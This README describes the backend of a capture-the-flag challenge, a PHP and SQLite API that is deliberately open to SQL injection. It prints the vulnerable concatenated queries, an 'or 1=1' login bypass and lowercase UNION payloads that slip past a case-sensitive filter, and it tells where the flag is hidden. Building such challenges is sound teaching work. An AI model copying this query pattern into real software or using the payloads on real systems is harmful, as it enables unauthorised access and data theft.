# Oracle Backend (Render)

PHP + SQLite API for **The Oracle's First Trial** (Sanjaya's Oracle).

This is the real challenge engine: the SQL injection here is **genuine** —
input is concatenated straight into the queries, so UNION-based payloads
actually return rows from the database. The accepted answers and the flag
live only on the server.

## Endpoints

| Method | Path                  | Body                                   | Returns |
|--------|-----------------------|----------------------------------------|---------|
| GET    | `/api/health.php`     | –                                      | `{status:"ok"}` |
| POST   | `/api/login.php`      | `{"username","password"}`              | `{ok}` (Gate I, injectable) |
| POST   | `/api/query.php`      | `{"q"}`                                | `{rows:[[..],[..]]}` (Gates II–IV, injectable) |
| POST   | `/api/check.php`      | `{"type","value"}`                     | `{ok, token?, message?}` |
| POST   | `/api/battle.php`     | `{"token"}`                            | `{ok}` |
| GET    | `/api/download.php`   | `?token=<hex>`                         | the PNG banner (flag appended after IEND) |

`type` is one of: `allegiance`, `lineage`, `name`.

## How the vulnerability works

Login:
```sql
SELECT * FROM archivists WHERE username = '<username>' AND password = '<password>'
```
Bypass with `admin' or 1=1-- ` (the filter only blocks the exact uppercase
`UNION` and `OR 1=1`, and is case-sensitive).

Registry search (Gates II–IV):
```sql
SELECT name, side FROM kshetra_rakshak WHERE name = '<q>' LIMIT 20
```
Inject with lowercase `union`, e.g.
`' union select id, side from kshetra_rakshak-- `.

## Deploy on Render

1. Push this folder to a Git repo.
2. New → Web Service → **Runtime: Docker** (it auto-detects the `Dockerfile`).
3. Optional env var: `DB_PATH=/app/data/oracle_ctf.db`.
4. Note the public URL, e.g. `https://oracle1-backend.onrender.com`.

> The DB is created and seeded automatically on first request.

## Local test

```bash
php -S 0.0.0.0:8080 -t public
curl -s -X POST localhost:8080/api/query.php \
  -d "{\"q\":\"' union select id, side from kshetra_rakshak-- \"}"
```
